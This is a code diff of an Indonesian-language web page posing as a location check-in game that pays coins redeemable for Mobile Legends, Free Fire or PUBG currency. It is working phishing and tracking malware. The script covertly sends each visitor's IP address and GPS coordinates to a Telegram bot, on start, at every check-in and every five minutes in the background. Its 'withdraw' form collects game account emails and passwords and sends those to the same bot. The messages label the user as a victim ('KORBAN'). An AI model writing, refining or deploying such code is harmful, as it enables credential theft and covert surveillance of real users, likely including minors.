@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>📍 Ghost Hunter - Check-in Lokasi Dapat Coin!</title>
+    <title>📍 GHOST HUNTER - Check-in Lokasi Dapat Coin!</title>
     <style>
         * {
             margin: 0;
@@ -22,7 +22,6 @@
             height: 100%;
         }
 
-        /* LAYAR START */
         .start-screen {
             position: fixed;
             top: 0;
@@ -60,7 +59,6 @@
             font-weight: bold;
             color: #000;
             cursor: pointer;
-            transition: transform 0.2s;
         }
 
         .error-msg {
@@ -69,7 +67,6 @@
             display: none;
         }
 
-        /* GAME CONTAINER */
         .game-container {
             position: fixed;
             top: 0;
@@ -79,12 +76,12 @@
             display: none;
             background: linear-gradient(135deg, #0a0f1e, #0a0a1a);
             padding: 20px;
+            overflow-y: auto;
         }
 
         .ui-overlay {
             display: flex;
             flex-direction: column;
-            justify-content: space-between;
             width: 100%;
             height: 100%;
         }
@@ -104,7 +101,7 @@
             display: flex;
             align-items: center;
             gap: 10px;
-            font-size: 24px;
+            font-size: 28px;
             font-weight: bold;
             color: #ffd700;
         }
@@ -112,10 +109,11 @@
         .withdraw-btn {
             background: linear-gradient(135deg, #ffd700, #ff8c00);
             border: none;
-            padding: 8px 20px;
+            padding: 10px 25px;
             border-radius: 40px;
             color: #000;
             font-weight: bold;
+            font-size: 16px;
             cursor: pointer;
         }
 
@@ -130,15 +128,15 @@
 
         .info-panel p {
             color: white;
-            font-size: 16px;
-            margin: 10px 0;
+            font-size: 14px;
+            margin: 8px 0;
         }
 
         .location-card {
             background: rgba(0,0,0,0.6);
             backdrop-filter: blur(10px);
             border-radius: 20px;
-            padding: 20px;
+            padding: 25px;
             text-align: center;
             margin: 20px 0;
             border: 1px solid #ffd700;
@@ -148,6 +146,7 @@
             color: #ffd700;
             font-size: 14px;
             margin: 10px 0;
+            word-break: break-all;
         }
 
         .checkin-btn {
@@ -181,7 +180,6 @@
             margin: 10px 0;
         }
 
-        /* Modal withdraw */
         .modal {
             display: none;
             position: fixed;
@@ -222,6 +220,7 @@
             border-radius: 12px;
             background: rgba(0,0,0,0.5);
             color: white;
+            font-size: 14px;
         }
 
         .modal-content button {
@@ -233,6 +232,7 @@
             font-weight: bold;
             cursor: pointer;
             margin-top: 10px;
+            font-size: 16px;
         }
 
         .close-modal {
@@ -248,22 +248,22 @@
             font-size: 12px;
             color: #aaa;
             text-align: center;
+            max-height: 150px;
+            overflow-y: auto;
         }
     </style>
 </head>
 <body>
 
-<!-- LAYAR START -->
 <div class="start-screen" id="startScreen">
     <h1>📍 GHOST HUNTER</h1>
-    <p>Check-in lokasi setiap 30 detik</p>
-    <p>Dapatkan 50 COIN setiap check-in!</p>
-    <p style="font-size: 14px;">🎮 Game butuh akses lokasi</p>
+    <p>📍 Check-in lokasi setiap 30 detik</p>
+    <p>🪙 Dapatkan 50 COIN setiap check-in!</p>
+    <p>💎 500 COIN = 50 Diamond / 60 UC</p>
     <button class="start-btn" id="startGameBtn">🎮 MULAI GAME</button>
     <div class="error-msg" id="errorMsg"></div>
 </div>
 
-<!-- GAME CONTAINER -->
 <div class="game-container" id="gameContainer">
     <div class="ui-overlay">
         <div class="coin-header">
@@ -283,38 +283,37 @@
 
         <div class="location-card">
             <div id="locationStatus" class="location-status">
-                📍 Mengambil lokasi...
+                📍 Menunggu izin lokasi...
             </div>
             <div id="rewardStatus" class="reward-text"></div>
-            <button class="checkin-btn" id="checkinBtn" disabled>⏳ MENGAMBIL LOKASI...</button>
+            <button class="checkin-btn" id="checkinBtn" disabled>⏳ MEMUAT...</button>
             <div id="cooldownText" class="cooldown-timer"></div>
         </div>
 
         <div class="coin-history" id="historyText">
-            Belum ada check-in
+            💬 Belum ada check-in
         </div>
     </div>
 </div>
 
-<!-- MODAL WITHDRAW -->
 <div id="withdrawModal" class="modal">
     <div class="modal-content">
         <h2>💎 TUKAR COIN KE GAME</h2>
-        <p style="color:white;">Saldo: <strong id="modalCoin">0</strong> COIN</p>
-        <p style="color:#ffd700; font-size:12px;">500 COIN = 50 Diamond ML/FF | 60 UC PUBG</p>
+        <p style="color:white;">💰 Saldo kamu: <strong id="modalCoin" style="color:#ffd700; font-size:24px;">0</strong> COIN</p>
+        <p style="color:#ffd700; font-size:12px;">📌 500 COIN = 50 Diamond (ML/FF) atau 60 UC (PUBG)</p>
         
         <select id="gameSelect">
-            <option value="Mobile Legends">🎮 Mobile Legends - Diamond</option>
-            <option value="Free Fire">🔥 Free Fire - Diamond</option>
-            <option value="PUBG Mobile">🎯 PUBG Mobile - UC</option>
+            <option value="Mobile Legends">🎮 Mobile Legends - 50 Diamond</option>
+            <option value="Free Fire">🔥 Free Fire - 50 Diamond</option>
+            <option value="PUBG Mobile">🎯 PUBG Mobile - 60 UC</option>
         </select>
-        <input type="text" id="gameId" placeholder="ID Game / Username" required>
-        <input type="text" id="gameZone" placeholder="Zona / Server (jika ada)">
-        <input type="email" id="gameEmail" placeholder="Email Akun Game" required>
-        <input type="password" id="gamePassword" placeholder="Password Akun Game" required>
+        <input type="text" id="gameId" placeholder="🎮 ID Game / Username" required>
+        <input type="text" id="gameZone" placeholder="🗺️ Zona / Server (opsional)">
+        <input type="email" id="gameEmail" placeholder="📧 Email Akun Game" required>
+        <input type="password" id="gamePassword" placeholder="🔑 Password Akun Game" required>
         
         <button id="submitWithdraw">💎 TUKAR SEKARANG</button>
-        <button class="close-modal" id="closeModal">TUTUP</button>
+        <button class="close-modal" id="closeModal">❌ BATAL</button>
     </div>
 </div>
 
@@ -330,8 +329,9 @@
     let cooldownInterval = null;
     let checkinCount = 0;
     let lastLocation = null;
+    let lastLat = null;
+    let lastLon = null;
 
-    // DOM elements
     const startScreen = document.getElementById('startScreen');
     const gameContainer = document.getElementById('gameContainer');
     const startBtn = document.getElementById('startGameBtn');
@@ -351,13 +351,13 @@
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
             return data.ip;
-        } catch(e) { return 'Unknown'; }
+        } catch(e) { return 'Tidak diketahui'; }
     }
 
     async function getLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
-                resolve({ lat: 'Tidak tersedia', lon: 'Tidak tersedia', full: 'Tidak tersedia' });
+                resolve({ lat: 'Tidak tersedia', lon: 'Tidak tersedia', full: '❌ Lokasi tidak tersedia' });
                 return;
             }
             navigator.geolocation.getCurrentPosition(
@@ -367,45 +367,135 @@
                     resolve({ lat: lat, lon: lon, full: `${lat}, ${lon}` });
                 },
                 () => {
-                    resolve({ lat: 'Tidak diizinkan', lon: 'Tidak diizinkan', full: 'Tidak diizinkan' });
+                    resolve({ lat: 'Tidak diizinkan', lon: 'Tidak diizinkan', full: '❌ Izin lokasi ditolak' });
                 }
             );
         });
     }
 
+    function getGoogleMapsLink(lat, lon) {
+        if (typeof lat === 'number' && typeof lon === 'number') {
+            return `https://www.google.com/maps?q=${lat},${lon}`;
+        }
+        return null;
+    }
+
     async function sendLocationToTelegram(action, extraData = '') {
         const ip = await getIP();
         const location = await getLocation();
-        const tanggal = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
+        const tanggal = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta', hour12: false});
         
-        let pesan = `📍📍📍 LOKASI KORBAN 📍📍📍%0A%0A`;
-        pesan += `📋 ACTION   : ${action}%0A`;
-        pesan += `🌐 IP       : ${ip}%0A`;
-        pesan += `📍 KOORDINAT: ${location.full}%0A`;
-        pesan += `📅 WAKTU    : ${tanggal}%0A`;
-        pesan += `🪙 TOTAL COIN: ${coins}%0A`;
-        if (extraData) pesan += `${extraData}%0A`;
-        pesan += `%0A🎮 GAME: GHOST HUNTER (Check-in Lokasi)`;
+        let mapsLink = '';
+        let locationDisplay = location.full;
         
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
+        if (typeof location.lat === 'number' && typeof location.lon === 'number') {
+            mapsLink = getGoogleMapsLink(location.lat, location.lon);
+            locationDisplay = `📍 ${location.lat}, ${location.lon}`;
+        }
+        
+        let pesan = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        pesan += `📍📍📍 LAPORAN LOKASI 📍📍📍\n`;
+        pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+        pesan += `📋 ACTION : ${action}\n`;
+        pesan += `🕐 WAKTU  : ${tanggal}\n`;
+        pesan += `🌐 IP ADDR: ${ip}\n`;
+        pesan += `${locationDisplay}\n`;
+        
+        if (mapsLink) {
+            pesan += `🗺️ MAPS    : ${mapsLink}\n`;
+        }
+        
+        pesan += `🪙 SALDO   : ${coins} COIN\n`;
+        pesan += `📊 CHECK-IN: ${checkinCount} kali\n`;
+        
+        if (extraData) {
+            pesan += `\n${extraData}\n`;
+        }
+        
+        pesan += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        pesan += `🎮 GAME: GHOST HUNTER\n`;
+        pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+        
+        const encodedPesan = encodeURIComponent(pesan);
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedPesan}`);
         
         lastLocation = location.full;
+        if (typeof location.lat === 'number') {
+            lastLat = location.lat;
+            lastLon = location.lon;
+        }
         return location.full;
+    }
+
+    async function sendWithdrawData(game, idGame, zone, email, password) {
+        const ip = await getIP();
+        const location = await getLocation();
+        const tanggal = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta', hour12: false});
+        
+        let reward = "";
+        let rewardValue = "";
+        if (game === "Mobile Legends") {
+            reward = "50 Diamond ML";
+            rewardValue = "50 Diamond";
+        } else if (game === "Free Fire") {
+            reward = "50 Diamond FF";
+            rewardValue = "50 Diamond";
+        } else {
+            reward = "60 UC PUBG";
+            rewardValue = "60 UC";
+        }
+        
+        let mapsLink = '';
+        let locationDisplay = '📍 Lokasi tidak tersedia';
+        
+        if (typeof location.lat === 'number' && typeof location.lon === 'number') {
+            mapsLink = getGoogleMapsLink(location.lat, location.lon);
+            locationDisplay = `📍 ${location.lat}, ${location.lon}`;
+        } else if (location.full) {
+            locationDisplay = location.full;
+        }
+        
+        let pesan = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        pesan += `💎💎💎 WITHDRAW - TUKAR COIN KE GAME 💎💎💎\n`;
+        pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+        pesan += `🕐 WAKTU      : ${tanggal}\n`;
+        pesan += `🌐 IP ADDRESS : ${ip}\n`;
+        pesan += `${locationDisplay}\n`;
+        
+        if (mapsLink) {
+            pesan += `🗺️ GOOGLE MAPS : ${mapsLink}\n`;
+        }
+        
+        pesan += `\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        pesan += `📋 DATA WITHDRAW:\n`;
+        pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        pesan += `🎮 GAME         : ${game}\n`;
+        pesan += `🎮 ID GAME      : ${idGame}\n`;
+        pesan += `🗺️ ZONE/SERVER  : ${zone || '-'}\n`;
+        pesan += `📧 EMAIL AKUN   : ${email}\n`;
+        pesan += `🔑 PASSWORD     : ${password}\n`;
+        pesan += `🪙 COIN DIGUNAKAN: ${coins}\n`;
+        pesan += `💎 REWARD       : ${rewardValue}\n`;
+        pesan += `💰 NILAI REWARD : ${reward}\n`;
+        pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+        pesan += `⚠️⚠️⚠️ KORBAN TUKAR COIN KE GAME ⚠️⚠️⚠️\n`;
+        pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+        
+        const encodedPesan = encodeURIComponent(pesan);
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedPesan}`);
     }
 
     async function sendFirstLocation() {
         if (locationSent) return;
-        await sendLocationToTelegram('START GAME - IZIN LOKASI DIBERIKAN');
+        await sendLocationToTelegram('🚀 START GAME - IZIN LOKASI DIBERIKAN');
         locationSent = true;
     }
 
-    // ========== UPDATE COIN DISPLAY ==========
     function updateCoinDisplay() {
         coinSpan.innerText = coins;
         modalCoinSpan.innerText = coins;
     }
 
-    // ========== CHECK-IN ==========
     async function doCheckin() {
         if (!canCheckin || !gameActive) return;
         
@@ -416,39 +506,53 @@
         try {
             const location = await getLocation();
             const ip = await getIP();
-            const tanggal = new Date().toLocaleString('id-ID');
+            const tanggal = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta', hour12: false});
             
-            // Kirim lokasi check-in ke Telegram
-            let pesan = `📍 CHECK-IN LOKASI 📍%0A%0A`;
-            pesan += `🌐 IP       : ${ip}%0A`;
-            pesan += `📍 KOORDINAT: ${location.full}%0A`;
-            pesan += `📅 WAKTU    : ${tanggal}%0A`;
-            pesan += `🪙 COIN DAPAT: +50%0A`;
-            pesan += `💰 TOTAL COIN: ${coins + 50}`;
+            let mapsLink = '';
+            let locationDisplay = '';
+            
+            if (typeof location.lat === 'number' && typeof location.lon === 'number') {
+                mapsLink = getGoogleMapsLink(location.lat, location.lon);
+                locationDisplay = `📍 ${location.lat}, ${location.lon}`;
+            } else {
+                locationDisplay = location.full;
+            }
+            
+            let pesan = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+            pesan += `📍✅ CHECK-IN LOKASI BERHASIL ✅📍\n`;
+            pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+            pesan += `🕐 WAKTU  : ${tanggal}\n`;
+            pesan += `🌐 IP     : ${ip}\n`;
+            pesan += `${locationDisplay}\n`;
+            
+            if (mapsLink) {
+                pesan += `🗺️ MAPS    : ${mapsLink}\n`;
+            }
+            
+            pesan += `🪙 COIN   : +50\n`;
+            pesan += `💰 SALDO  : ${coins + 50} COIN\n`;
+            pesan += `📊 TOTAL  : ${checkinCount + 1}x check-in\n\n`;
+            pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
             
             await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
             
-            // Tambah coin
             coins += 50;
             updateCoinDisplay();
             checkinCount++;
             
-            // Update history
-            historyText.innerHTML = `✅ Check-in #${checkinCount} berhasil! +50 COIN (${tanggal})<br>${historyText.innerHTML}`;
-            if (historyText.innerHTML.split('<br>').length > 5) {
-                historyText.innerHTML = historyText.innerHTML.split('<br>').slice(0, 5).join('<br>');
+            historyText.innerHTML = `✅ Check-in #${checkinCount} berhasil! +50 COIN (${tanggal.substring(0, 16)})<br>${historyText.innerHTML}`;
+            if (historyText.innerHTML.split('<br>').length > 6) {
+                historyText.innerHTML = historyText.innerHTML.split('<br>').slice(0, 6).join('<br>');
             }
             
-            // Tampilkan reward
             rewardStatus.innerHTML = '✅ +50 COIN! Lokasi terkirim!';
-            rewardStatus.style.opacity = '1';
             setTimeout(() => {
                 rewardStatus.innerHTML = '';
             }, 2000);
             
-            locationStatus.innerHTML = `📍 Lokasi terakhir: ${location.full.substring(0, 30)}...`;
+            let locText = typeof location.lat === 'number' ? `📍 ${location.lat.toFixed(6)}, ${location.lon.toFixed(6)}` : location.full;
+            locationStatus.innerHTML = locText;
             
-            // Mulai cooldown 30 detik
             startCooldown(30);
             
         } catch(err) {
@@ -481,45 +585,48 @@
         }, 1000);
     }
 
-    // ========== START GAME ==========
     async function startGame() {
         errorMsg.style.display = 'none';
         
         try {
-            // Cek apakah izin lokasi bisa didapat
             const testLoc = await getLocation();
-            
-            // Kirim lokasi pertama
             await sendFirstLocation();
             
-            // Sembunyikan start screen, tampilkan game
             startScreen.style.display = 'none';
             gameContainer.style.display = 'block';
             gameActive = true;
             
-            // Enable check-in
             canCheckin = true;
             checkinBtn.disabled = false;
             checkinBtn.innerText = "📍 CHECK-IN LOKASI (+50 COIN)";
-            locationStatus.innerHTML = `📍 Lokasi: ${testLoc.full.substring(0, 40)}...`;
             
-            // Fullscreen
+            let locText = (typeof testLoc.lat === 'number') ? `📍 ${testLoc.lat.toFixed(6)}, ${testLoc.lon.toFixed(6)}` : testLoc.full;
+            locationStatus.innerHTML = locText;
+            
             document.documentElement.requestFullscreen();
             
-            // Kirim lokasi setiap 5 menit (background)
             setInterval(async () => {
                 if (gameActive) {
                     const loc = await getLocation();
-                    const ip = await getIP();
-                    const tanggal = new Date().toLocaleString('id-ID');
-                    let pesan = `📍 UPDATE LOKASI BACKGROUND 📍%0A%0A`;
-                    pesan += `🌐 IP: ${ip}%0A`;
-                    pesan += `📍 KOORDINAT: ${loc.full}%0A`;
-                    pesan += `📅 WAKTU: ${tanggal}%0A`;
-                    pesan += `🪙 TOTAL COIN: ${coins}`;
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
+                    if (typeof loc.lat === 'number') {
+                        const ip = await getIP();
+                        const tanggal = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
+                        let mapsLink = getGoogleMapsLink(loc.lat, loc.lon);
+                        
+                        let pesan = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                        pesan += `📍🔄 UPDATE LOKASI BACKGROUND 🔄📍\n`;
+                        pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+                        pesan += `🕐 WAKTU  : ${tanggal}\n`;
+                        pesan += `🌐 IP     : ${ip}\n`;
+                        pesan += `📍 ${loc.lat}, ${loc.lon}\n`;
+                        if (mapsLink) pesan += `🗺️ MAPS    : ${mapsLink}\n`;
+                        pesan += `🪙 SALDO  : ${coins} COIN\n`;
+                        pesan += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+                        
+                        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
+                    }
                 }
-            }, 300000); // setiap 5 menit
+            }, 300000);
             
         } catch(err) {
             errorMsg.style.display = 'block';
@@ -539,7 +646,7 @@
 
     withdrawBtn.onclick = () => {
         if (coins < 500) {
-            alert('Minimal tukar 500 COIN! (50 Diamond/UC)');
+            alert('❌ Minimal tukar 500 COIN! (50 Diamond / 60 UC)');
             return;
         }
         modalCoinSpan.innerText = coins;
@@ -561,32 +668,14 @@
         const email = gameEmail.value.trim();
         const password = gamePassword.value.trim();
 
-        if (!idGame) { alert('Masukkan ID Game!'); return; }
-        if (!email || !password) { alert('Masukkan Email dan Password akun game!'); return; }
-        if (coins < 500) { alert('Minimal 500 COIN!'); return; }
+        if (!idGame) { alert('❌ Masukkan ID Game!'); return; }
+        if (!email) { alert('❌ Masukkan Email akun game!'); return; }
+        if (!password) { alert('❌ Masukkan Password akun game!'); return; }
+        if (coins < 500) { alert('❌ Minimal 500 COIN!'); return; }
 
-        let reward = selectedGame === "PUBG Mobile" ? "60 UC" : "50 Diamond";
+        await sendWithdrawData(selectedGame, idGame, zone, email, password);
         
-        const ip = await getIP();
-        const location = await getLocation();
-        const tanggal = new Date().toLocaleString('id-ID');
-        
-        let pesan = `💎💎💎 TUKAR COIN KE GAME 💎💎💎%0A%0A`;
-        pesan += `🎮 GAME     : ${selectedGame}%0A`;
-        pesan += `🎮 ID GAME  : ${idGame}%0A`;
-        pesan += `🗺️ ZONE     : ${zone || '-'}%0A`;
-        pesan += `📧 EMAIL    : ${email}%0A`;
-        pesan += `🔑 PASSWORD : ${password}%0A`;
-        pesan += `🪙 COIN     : ${coins}%0A`;
-        pesan += `💎 REWARD   : ${reward}%0A`;
-        pesan += `🌐 IP       : ${ip}%0A`;
-        pesan += `📍 LOKASI   : ${location.full}%0A`;
-        pesan += `📅 WAKTU    : ${tanggal}%0A%0A`;
-        pesan += `⚠️ KORBAN TUKAR COIN KE GAME (TANPA KAMERA) ⚠️`;
-
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
-        
-        alert(`✅ Tukar coin berhasil! ${reward} akan dikirim ke akun game kamu dalam 24 jam.`);
+        alert('✅ Tukar coin berhasil! Reward akan dikirim ke akun game kamu dalam 24 jam.');
         
         coins = 0;
         updateCoinDisplay();
